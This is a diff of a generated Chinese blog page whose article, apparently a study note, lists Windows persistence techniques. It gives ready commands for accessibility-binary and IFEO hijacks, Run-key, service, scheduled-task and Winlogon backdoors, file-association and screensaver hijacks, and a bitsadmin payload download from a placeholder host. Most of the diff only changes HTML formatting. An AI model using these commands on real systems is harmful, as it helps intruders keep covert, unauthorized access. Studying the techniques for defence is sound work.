@@ -20,12 +20,12 @@
         <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
     
     <meta name="description" content="">
-    <meta name="description" content="[toc] 简单记录下Windows权限维持的内容。 0x1 辅助功能镜像劫持 先前的版本可以直接更换： 12345屏幕键盘： C:\Windows\System32\osk.exe放大镜： C:\Windows\System32\Magnify.exe旁白： C:\Windows\System32\Narrator.exe显示切换器 C:\Windows\System32\Display">
+    <meta name="description" content="[toc] 简单记录下Windows权限维持的内容。 0x1 辅助功能镜像劫持先前的版本可以直接更换： 12345屏幕键盘： C:\Windows\System32\osk.exe放大镜： C:\Windows\System32\Magnify.exe旁白： C:\Windows\System32\Narrator.exe显示切换器 C:\Windows\System32\DisplaySwitc">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Windows权限维持学习">
 <meta property="og:url" content="http://example.com/2022/03/08/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/index.html">
 <meta property="og:site_name" content="郁涛丶&#39;s Blog">
-<meta property="og:description" content="[toc] 简单记录下Windows权限维持的内容。 0x1 辅助功能镜像劫持 先前的版本可以直接更换： 12345屏幕键盘： C:\Windows\System32\osk.exe放大镜： C:\Windows\System32\Magnify.exe旁白： C:\Windows\System32\Narrator.exe显示切换器 C:\Windows\System32\Display">
+<meta property="og:description" content="[toc] 简单记录下Windows权限维持的内容。 0x1 辅助功能镜像劫持先前的版本可以直接更换： 12345屏幕键盘： C:\Windows\System32\osk.exe放大镜： C:\Windows\System32\Magnify.exe旁白： C:\Windows\System32\Narrator.exe显示切换器 C:\Windows\System32\DisplaySwitc">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://example.com/2022/03/08/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308172433830.png">
 <meta property="og:image" content="http://example.com/2022/03/08/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308172741639.png">
@@ -513,65 +513,57 @@
     <article class="article-entry">
         <p>[toc]</p>
 <p>简单记录下Windows权限维持的内容。</p>
-<h1 id="x1-辅助功能镜像劫持">0x1 辅助功能镜像劫持</h1>
-<p>先前的版本可以直接更换：</p>
+<h1 id="0x1-辅助功能镜像劫持"><a href="#0x1-辅助功能镜像劫持" class="headerlink" title="0x1 辅助功能镜像劫持"></a>0x1 辅助功能镜像劫持</h1><p>先前的版本可以直接更换：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">屏幕键盘： C:\Windows\System32\osk.exe</span><br><span class="line">放大镜： C:\Windows\System32\Magnify.exe</span><br><span class="line">旁白： C:\Windows\System32\Narrator.exe</span><br><span class="line">显示切换器 C:\Windows\System32\DisplaySwitch.exe</span><br><span class="line">应用切换器： C:\Windows\System32\AtBroker.exe</span><br></pre></td></tr></table></figure>
+
 <p>直接命令行：</p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">copy c:\windows\system32\sethc.ex c:\windows\system32\sethc1.exe</span><br><span class="line">copy c:\windows\system32\cmd.exe c:\windows\system32\sethc.exe</span><br></pre></td></tr></table></figure>
+
 <p>高版本需要IFEO。所谓的IFEO就是Image File Execution Options，直译过来就是映像劫持。它又被称为“重定向劫持”（Redirection Hijack），它和“映像劫持”（Image Hijack，或IFEO Hijack）只是称呼不同，实际上都是一样的技术手段。白话来讲就是做某个操作的时候被拦截下来，干了别的事。</p>
-<p>在iexplorer.exe中加键值对：debugger c:.exe</p>
-<figure>
-<img src="/2022/03/08/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308172433830.png" alt="image-20220308172433830"><figcaption aria-hidden="true">image-20220308172433830</figcaption>
-</figure>
+<p>在iexplorer.exe中加键值对：debugger  c:\windows\system32\cmd.exe</p>
+<p><img src="/2022/03/08/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308172433830.png" alt="image-20220308172433830"></p>
 <p>或者直接命令行(需要管理员权限)：</p>
-<p><code>reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\iexplore.exe" /v "Debugger" /t REG_SZ /d "c:\windows\system32\cmd.exe" /f</code></p>
-<figure>
-<img src="/2022/03/08/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308172741639.png" alt="image-20220308172741639"><figcaption aria-hidden="true">image-20220308172741639</figcaption>
-</figure>
-<h1 id="x2.启动项服务后门">0x2.启动项/服务后门</h1>
-<h2 id="开始菜单启动项">开始菜单启动项</h2>
-<p>开始菜单启动项，指示启动文件夹的位置，具体的位置是“开始”菜单中的“所有程序”-“启动”选项：</p>
+<p><code>reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\iexplore.exe&quot; /v &quot;Debugger&quot; /t REG_SZ /d &quot;c:\windows\system32\cmd.exe&quot; /f</code></p>
+<p><img src="/2022/03/08/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308172741639.png" alt="image-20220308172741639"></p>
+<h1 id="0x2-启动项-x2F-服务后门"><a href="#0x2-启动项-x2F-服务后门" class="headerlink" title="0x2.启动项&#x2F;服务后门"></a>0x2.启动项&#x2F;服务后门</h1><h2 id="开始菜单启动项"><a href="#开始菜单启动项" class="headerlink" title="开始菜单启动项"></a>开始菜单启动项</h2><p>开始菜单启动项，指示启动文件夹的位置，具体的位置是“开始”菜单中的“所有程序”-“启动”选项：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\SD\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</span><br></pre></td></tr></table></figure>
+
 <p>相关键值：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders </span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders </span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders </span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</span><br></pre></td></tr></table></figure>
+
 <p>重启后会自动自启</p>
-<h2 id="启动项注册表后门">启动项注册表后门</h2>
-<p><code>HKEY_CURRENT_USER</code>的改动不需要管理员权限。（更改<code>HKEY_LOCAL_MACHINE</code>需要管理员权限）</p>
+<h2 id="启动项注册表后门"><a href="#启动项注册表后门" class="headerlink" title="启动项注册表后门"></a>启动项注册表后门</h2><p><code>HKEY_CURRENT_USER</code>的改动不需要管理员权限。（更改<code>HKEY_LOCAL_MACHINE</code>需要管理员权限）</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce</span><br></pre></td></tr></table></figure>
-<figure>
-<img src="/2022/03/08/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308175519252.png" alt="image-20220308175519252"><figcaption aria-hidden="true">image-20220308175519252</figcaption>
-</figure>
+
+<p><img src="/2022/03/08/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308175519252.png" alt="image-20220308175519252"></p>
 <p>同样，重启后会自启动。</p>
 <p>使用命令行，修改hklm，需要管理员：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run   /v &quot;123&quot; /t REG_SZ /d &quot;C:\Windows\System32\cmd.exe&quot; /f</span><br></pre></td></tr></table></figure>
-<h2 id="自启动服务后门">自启动服务后门</h2>
-<blockquote>
-<p>在 Windows上还有一个重要的机制，也就是服务。服务程序通常默默的运行在后台，且拥有 SYSTEM 权限，非常适合用于后门持久化。我们可以将 EXE /DLL等可执行文件注册为服务实现后门持久化。</p>
+
+<h2 id="自启动服务后门"><a href="#自启动服务后门" class="headerlink" title="自启动服务后门"></a>自启动服务后门</h2><blockquote>
+<p>  在 Windows上还有一个重要的机制，也就是服务。服务程序通常默默的运行在后台，且拥有 SYSTEM 权限，非常适合用于后门持久化。我们可以将 EXE &#x2F;DLL等可执行文件注册为服务实现后门持久化。</p>
 </blockquote>
 <p>可以通过如下命令行方式添加一个服务：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc create asdfadfa binpath=   &quot;C:\Users\SD\Desktop\test.exe&quot;  start= &quot;auto&quot; obj=&quot;LocalSystem&quot;</span><br><span class="line">sc start asdfadfa </span><br></pre></td></tr></table></figure>
+
 <p>删除服务：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc delete asdfadfa</span><br></pre></td></tr></table></figure>
+
 <p>或者powershell：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">New-Service -Name &quot;pentestlab&quot; -BinaryPathName &quot;C:\temp\pentestlab.exe&quot; -Description &quot;PentestLaboratories&quot; -StartupType Automatic</span><br><span class="line">sc start pentestlab</span><br></pre></td></tr></table></figure>
-<figure>
-<img src="/2022/03/08/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308181535484.png" alt="image-20220308181535484"><figcaption aria-hidden="true">image-20220308181535484</figcaption>
-</figure>
-<h1 id="x3.系统计划任务后门">0x3.系统计划任务后门</h1>
-<blockquote>
-<p>Windows实现定时任务主要有schtasks与at二种方式:</p>
-<p>At 适用于windows xp/2003，Schtasks适用于win7/2008或者以后</p>
+
+<p><img src="/2022/03/08/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308181535484.png" alt="image-20220308181535484"></p>
+<h1 id="0x3-系统计划任务后门"><a href="#0x3-系统计划任务后门" class="headerlink" title="0x3.系统计划任务后门"></a>0x3.系统计划任务后门</h1><blockquote>
+<p>  Windows实现定时任务主要有schtasks与at二种方式:</p>
+<p>  At 适用于windows xp&#x2F;2003，Schtasks适用于win7&#x2F;2008或者以后</p>
 </blockquote>
 <p><code>taskschd.msc</code></p>
 <p>5min执行一次</p>
-<p><code>schtasks /create /sc minute /mo 5   /tn "aaaa" /tr C:\Windows\System32\cmd.exe</code></p>
-<figure>
-<img src="/2022/03/08/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308182919522.png" alt="image-20220308182919522"><figcaption aria-hidden="true">image-20220308182919522</figcaption>
-</figure>
-<h1 id="x4.dll劫持">0x4.DLL劫持</h1>
-<blockquote>
-<p>DLL劫持漏洞之所以被称为漏洞，还要从负责加载DLL的系统API LoadLibrary 来看。熟悉Windows代 码的同学都知道，调⽤ LoadLibrary 时可以使⽤DLL的相对路径。这时，系统会按照特定的顺序搜索⼀ 些⽬录，以确定DLL的完整路径。根据MSDN⽂档的约定，在使⽤相对路径调⽤ LoadLibrary （同样适 ⽤于其他同类DLL LoadLibraryEx，ShellExecuteEx等）时，系统会依次从以下6个位置去查找所需要的 DLL⽂件（会根据SafeDllSearchMode配置⽽稍有不同）。</p>
-<ol type="1">
+<p><code>schtasks /create /sc minute /mo 5   /tn &quot;aaaa&quot; /tr C:\Windows\System32\cmd.exe</code></p>
+<p><img src="/2022/03/08/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308182919522.png" alt="image-20220308182919522"></p>
+<h1 id="0x4-DLL劫持"><a href="#0x4-DLL劫持" class="headerlink" title="0x4.DLL劫持"></a>0x4.DLL劫持</h1><blockquote>
+<p>  DLL劫持漏洞之所以被称为漏洞，还要从负责加载DLL的系统API LoadLibrary 来看。熟悉Windows代 码的同学都知道，调⽤ LoadLibrary 时可以使⽤DLL的相对路径。这时，系统会按照特定的顺序搜索⼀ 些⽬录，以确定DLL的完整路径。根据MSDN⽂档的约定，在使⽤相对路径调⽤ LoadLibrary （同样适 ⽤于其他同类DLL LoadLibraryEx，ShellExecuteEx等）时，系统会依次从以下6个位置去查找所需要的 DLL⽂件（会根据SafeDllSearchMode配置⽽稍有不同）。</p>
+<ol>
 <li>程序所在⽬录。</li>
 <li>加载 DLL 时所在的当前⽬录。</li>
 <li>系统⽬录即 SYSTEM32 ⽬录。</li>
@@ -579,109 +571,98 @@
 <li>Windows⽬录。</li>
 <li>PATH环境变量中列出的⽬录</li>
 </ol>
-<p>dll劫持就发⽣在系统按照顺序搜索这些特定⽬录时。只要⿊客能够将恶意的DLL放在优先于正常DLL所在的⽬录，就能够欺骗系统优先加载恶意DLL，来实现“劫持”。</p>
+<p>  dll劫持就发⽣在系统按照顺序搜索这些特定⽬录时。只要⿊客能够将恶意的DLL放在优先于正常DLL所在的⽬录，就能够欺骗系统优先加载恶意DLL，来实现“劫持”。</p>
 </blockquote>
 <p>在win7及win7以上系统增加了KnownDLLs保护，需要在如下注册表下添加dll才能顺利劫持：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\ExcludeFromKnownDlls</span><br></pre></td></tr></table></figure>
+
 <p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/225911">DLL劫持原理及其漏洞挖掘（一）</a></p>
-<h1 id="x5.winlogon用户登录初始化">0x5.Winlogon用户登录初始化</h1>
-<p>winlogon.exe是windows中非常重要的进程,在用户还没登录系统之前就已经存在,并与密码验证相关的重要任务精密相关。例如，当在用户登录时，Winlogon 进程负责将用户配置文件加载到注册表中:</p>
+<h1 id="0x5-Winlogon用户登录初始化"><a href="#0x5-Winlogon用户登录初始化" class="headerlink" title="0x5.Winlogon用户登录初始化"></a>0x5.Winlogon用户登录初始化</h1><p>winlogon.exe是windows中非常重要的进程,在用户还没登录系统之前就已经存在,并与密码验证相关的重要任务精密相关。例如，当在用户登录时，Winlogon 进程负责将用户配置文件加载到注册表中:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HKLM\Software\Microsoft\WindowsNT\CurrentVersion\Winlogon\</span><br><span class="line">HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\</span><br></pre></td></tr></table></figure>
+
 <p>命令行:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg delete &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; /v Userinit /f</span><br><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;  /v &quot;Userinit&quot; /t REG_SZ /d &quot;C:\Windows\system32\cmd.exe,&quot; /f</span><br></pre></td></tr></table></figure>
+
 <p>powershell：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-ItemProperty   &quot;HKLM:\SOFTWARE\Microsoft\WINDOWS NT\CurrentVersion\Winlogon&quot; -name   Userinit -value &quot;C:\Windows\system32\userinit.exe,C:\Windows\system32\cmd.exe&quot;</span><br></pre></td></tr></table></figure>
-<figure>
-<img src="/2022/03/08/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308184001989.png" alt="image-20220308184001989"><figcaption aria-hidden="true">image-20220308184001989</figcaption>
-</figure>
-<h1 id="x6.logon-scripts后门">0x6.Logon Scripts后门</h1>
-<p>Windows登录脚本，当用户登录时触发，<strong>Logon Scripts能够优先于杀毒软件执行，绕过杀毒软件对敏感操作的拦截</strong>。</p>
+
+<p><img src="/2022/03/08/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308184001989.png" alt="image-20220308184001989"></p>
+<h1 id="0x6-Logon-Scripts后门"><a href="#0x6-Logon-Scripts后门" class="headerlink" title="0x6.Logon Scripts后门"></a>0x6.Logon Scripts后门</h1><p>Windows登录脚本，当用户登录时触发，<strong>Logon Scripts能够优先于杀毒软件执行，绕过杀毒软件对敏感操作的拦截</strong>。</p>
 <p>注册表位置:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Environment</span><br></pre></td></tr></table></figure>
-<figure>
-<img src="/2022/03/08/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308184533410.png" alt="image-20220308184533410"><figcaption aria-hidden="true">image-20220308184533410</figcaption>
-</figure>
-<h1 id="x7.文件关联">0x7.文件关联</h1>
-<p>文件关联就是将一种类型的文件与一个可以打开它的程序建立起一种依存关系，一个文件可以与多个应用程序发生关联。</p>
+
+<p><img src="/2022/03/08/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308184533410.png" alt="image-20220308184533410"></p>
+<h1 id="0x7-文件关联"><a href="#0x7-文件关联" class="headerlink" title="0x7.文件关联"></a>0x7.文件关联</h1><p>文件关联就是将一种类型的文件与一个可以打开它的程序建立起一种依存关系，一个文件可以与多个应用程序发生关联。</p>
 <p>可以用assoc命令显示或修改文件扩展名关联，使用ftype显示或修改文件类型</p>
-<figure>
-<img src="/2022/03/08/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308185550636.png" alt="image-20220308185550636"><figcaption aria-hidden="true">image-20220308185550636</figcaption>
-</figure>
+<p><img src="/2022/03/08/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308185550636.png" alt="image-20220308185550636"></p>
 <p>需要管理员权限</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKCR\txtfile\shell\open\command&quot; /ve /t REG_EXPAND_SZ /d &quot;C:\Windows\system32\cmd.exe %1&quot; /f</span><br></pre></td></tr></table></figure>
-<figure>
-<img src="/2022/03/08/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308185838423.png" alt="image-20220308185838423"><figcaption aria-hidden="true">image-20220308185838423</figcaption>
-</figure>
-<h1 id="x8.bitsadmin">0x8.Bitsadmin</h1>
-<blockquote>
-<p><a target="_blank" rel="noopener" href="https://toutiao.io/posts/bcz5e1o/preview">BITSAdmin的介绍与Windows渗透测试中的使用</a></p>
-<p><a target="_blank" rel="noopener" href="https://micro8.gitbook.io/micro8/contents-1/41-50/41bitsadmin-yi-ju-hua-xia-zai-payload">bitsadmin一句话下载payload</a></p>
+
+<p><img src="/2022/03/08/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308185838423.png" alt="image-20220308185838423"></p>
+<h1 id="0x8-Bitsadmin"><a href="#0x8-Bitsadmin" class="headerlink" title="0x8.Bitsadmin"></a>0x8.Bitsadmin</h1><blockquote>
+<p>  <a target="_blank" rel="noopener" href="https://toutiao.io/posts/bcz5e1o/preview">BITSAdmin的介绍与Windows渗透测试中的使用</a></p>
+<p>  <a target="_blank" rel="noopener" href="https://micro8.gitbook.io/micro8/contents-1/41-50/41bitsadmin-yi-ju-hua-xia-zai-payload">bitsadmin一句话下载payload</a></p>
 </blockquote>
 <blockquote>
-<p>Windows操作系统包含各种实用程序，系统管理员可以使用它们来执行各种任务。这些实用程序之一是后台智能传输服务（BITS），它可以促进文件到Web服务器（HTTP）和共享文件夹（SMB）的传输能力。Microsoft提供了一个名为“ bitsadmin ” 的二进制文件和PowerShell cmdlet，用于创建和管理文件传输。</p>
+<p>  Windows操作系统包含各种实用程序，系统管理员可以使用它们来执行各种任务。这些实用程序之一是后台智能传输服务（BITS），它可以促进文件到Web服务器（HTTP）和共享文件夹（SMB）的传输能力。Microsoft提供了一个名为“ bitsadmin ” 的二进制文件和PowerShell cmdlet，用于创建和管理文件传输。</p>
 </blockquote>
 <p>window7以上自带：<code>c:\windows\system32\bitsadmin.exe</code></p>
 <p>使用功能transfer参数下载</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\bitsadmin.exe /transfer backdoor &quot;http://sssssssss/CM.EXE&quot; C:\1.exe</span><br></pre></td></tr></table></figure>
+
 <p>复制本地文件：</p>
 <p>BITSAdmin遵循文件传输的原则。因此，可以将其用作复制和粘贴命令。这意味着BITSAdmin也能将同一台计算机上的一个位置传输到另一个位置。</p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /create whitehat_day <span class="comment">#创建一个whitehat_day的任务。</span></span><br><span class="line"><span class="comment">#使用/addfile参数将传输文件添加到whitehat_day任务中，并声明传输的文件名与路径，和保存位置与名称</span></span><br><span class="line">bitsadmin /addfile whitehat_day d:\file.txt d:\testfile.txt</span><br><span class="line">bitsadmin /resume whitehat_day<span class="comment">#使用/resume参数来开启传输。</span></span><br><span class="line">bitsadmin /complete whitehat_day<span class="comment">#以临时文件的形式传输文件。要获取完整的文件，需要使用/complete参数</span></span><br><span class="line">Get-ChildItem -Path d:\  <span class="comment">#查看目标路径下是否存在file.txt</span></span><br></pre></td></tr></table></figure>
-<h1 id="x9.屏幕保护程序">0x9.屏幕保护程序</h1>
-<blockquote>
-<p>利用前提:对方开启了屏幕保护</p>
-<p>屏幕保护程序，当初的设计是为了防止长期屏幕的显示，预防老化与缩短屏幕显示器老化的一种保护程序。</p>
+
+<h1 id="0x9-屏幕保护程序"><a href="#0x9-屏幕保护程序" class="headerlink" title="0x9.屏幕保护程序"></a>0x9.屏幕保护程序</h1><blockquote>
+<p>  利用前提:对方开启了屏幕保护</p>
+<p>  屏幕保护程序，当初的设计是为了防止长期屏幕的显示，预防老化与缩短屏幕显示器老化的一种保护程序。</p>
 </blockquote>
 <p>注册表位置:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaveActive</span><br><span class="line">HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaverIsSecure</span><br><span class="line">HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaveTimeOut</span><br><span class="line">HKEY_CURRENT_USER\Control Panel\Desktop\SCRNSAVE.EXE</span><br></pre></td></tr></table></figure>
+
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;hkcu\control panel\desktop&quot; /v SCRNSAVE.EXE /d C:\Users\hunter\Desktop\beacon.exe /f</span><br><span class="line">reg add &quot;hkcu\control panel\desktop&quot; /v ScreenSaveActive /d 1 /f</span><br><span class="line">reg add &quot;hkcu\control panel\desktop&quot; /v ScreenSaverIsSecure /d 0 /f</span><br><span class="line">reg add &quot;hkcu\control panel\desktop&quot; /v ScreenSaveTimeOut /d 60 /f</span><br></pre></td></tr></table></figure>
-<p>如果从未设置过屏保程序的话，除“ScreenSaveActive”默认值为1，其他键都是不存在的，而屏保程序的正常运行必须保证这几个键都有数据才可以，因此必须把4个键都重写一遍。另外，经测试屏保程序最短触发时间为60秒，即使改成小于60的数值，依然还是60秒后执行程序。 当然，从注册表路径也可以看出这种方式只能获得当前用户权限的shell，优点是不需要提权即可维持。</p>
-<h1 id="xa-wmi构造无文件后门待完成">0xA WMI构造无文件后门（待完成）</h1>
-<p>WMI(Windows Management Instrumentation，即Windows管理规范)，大多数基于Windows的软件依赖于此服务。</p>
+
+<p>如果从未设置过屏保程序的话，除“ScreenSaveActive”默认值为1，其他键都是不存在的，而屏保程序的正常运行必须保证这几个键都有数据才可以，因此必须把4个键都重写一遍。另外，经测试屏保程序最短触发时间为60秒，即使改成小于60的数值，依然还是60秒后执行程序。<br>当然，从注册表路径也可以看出这种方式只能获得当前用户权限的shell，优点是不需要提权即可维持。</p>
+<h1 id="0xA-WMI构造无文件后门（待完成）"><a href="#0xA-WMI构造无文件后门（待完成）" class="headerlink" title="0xA WMI构造无文件后门（待完成）"></a>0xA WMI构造无文件后门（待完成）</h1><p>WMI(Windows Management Instrumentation，即Windows管理规范)，大多数基于Windows的软件依赖于此服务。</p>
 <blockquote>
-<p><a target="_blank" rel="noopener" href="https://wooyun.js.org/drops/WMI%20%E7%9A%84%E6%94%BB%E5%87%BB%EF%BC%8C%E9%98%B2%E5%BE%A1%E4%B8%8E%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E4%B9%8B%E6%94%BB%E5%87%BB%E7%AF%87.html">WMI的攻击，防御与取证分析技术之攻击篇</a></p>
-<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2080">wmi与vbs</a></p>
-<p><a target="_blank" rel="noopener" href="https://m0nst3r.me/pentest/利用WMI构建一个持久化的异步的无文件后门.html">利用WMI构建一个持久化的异步的无文件后门</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.51cto.com/antivirusjo/2092545">WMI利用专题</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/88851">Powershell攻击指南黑客后渗透之道系列——进阶利用</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.fireeye.com/blog/threat-research/2017/03/wmimplant_a_wmi_ba.html">A WMI Based Agentless Post-Exploitation RAT Developed in PowerShell</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.tuicool.com/articles/zmUVbyJ">WMI Backdoor</a></p>
-<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/appendix-l--events-to-monitor">Appendix L: Events to Monitor</a></p>
-<p><a target="_blank" rel="noopener" href="http://demon.tw/copy-paste/vbs-wmi-trojan-3.html">利用WMI打造完美“三无”后门</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.tuicool.com/articles/IzieuyR">如何检测并移除WMI持久化后门？</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/85851">解析APT29的无文件WMI和PowerShell后门</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.aqniu.com/learn/31053.html">无文件攻击的兴起与应对之道</a></p>
+<p>  <a target="_blank" rel="noopener" href="https://wooyun.js.org/drops/WMI%20%E7%9A%84%E6%94%BB%E5%87%BB%EF%BC%8C%E9%98%B2%E5%BE%A1%E4%B8%8E%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E4%B9%8B%E6%94%BB%E5%87%BB%E7%AF%87.html">WMI的攻击，防御与取证分析技术之攻击篇</a></p>
+<p>  <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2080">wmi与vbs</a></p>
+<p>  <a target="_blank" rel="noopener" href="https://m0nst3r.me/pentest/%E5%88%A9%E7%94%A8WMI%E6%9E%84%E5%BB%BA%E4%B8%80%E4%B8%AA%E6%8C%81%E4%B9%85%E5%8C%96%E7%9A%84%E5%BC%82%E6%AD%A5%E7%9A%84%E6%97%A0%E6%96%87%E4%BB%B6%E5%90%8E%E9%97%A8.html">利用WMI构建一个持久化的异步的无文件后门</a></p>
+<p>  <a target="_blank" rel="noopener" href="https://blog.51cto.com/antivirusjo/2092545">WMI利用专题</a></p>
+<p>  <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/88851">Powershell攻击指南黑客后渗透之道系列——进阶利用</a></p>
+<p>  <a target="_blank" rel="noopener" href="https://www.fireeye.com/blog/threat-research/2017/03/wmimplant_a_wmi_ba.html">A WMI Based Agentless Post-Exploitation RAT Developed in PowerShell</a></p>
